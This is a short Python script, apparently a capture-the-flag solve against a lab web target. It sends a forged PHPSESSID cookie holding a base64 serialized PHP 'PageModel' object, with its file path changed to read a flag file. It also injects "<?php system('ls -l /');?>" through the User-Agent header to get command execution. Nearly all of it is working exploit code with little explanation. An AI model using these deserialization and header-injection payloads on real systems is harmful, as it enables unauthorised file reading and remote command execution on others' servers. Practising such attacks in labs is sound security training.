# #create a function that sends requests to web server with cookies and headers and returns the response

# #the function should return None if the request fails

# import requests

# def send_request(url, cookies, headers):
#     try:
#         response = requests.get(url, cookies=cookies, headers=headers)
#         return response
#     except:
#         return None
    
# cookies = {'PHPSESSID':"Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9"}
# headers = {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"}
# url = "http://165.227.228.154:32601/"

# response = requests.get(url, cookies=cookies, headers=headers)
# webpage = response.text

# print(response.text)




import requests

# CODE FOR THE COOKIE SHOWN AT THE BOTTOM OF THE SOURCE CODE
cookies = {'PHPSESSID': "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfdTdLZjMiO30="}
headers = {'User-Agent': "<?php system('ls -l /');?>"}
url = "http://165.227.228.154:32601/" # address and port changes whenever start a new instance of the website

response = requests.get(url, cookies=cookies, headers=headers)
webpage = response.text

print(response.text)
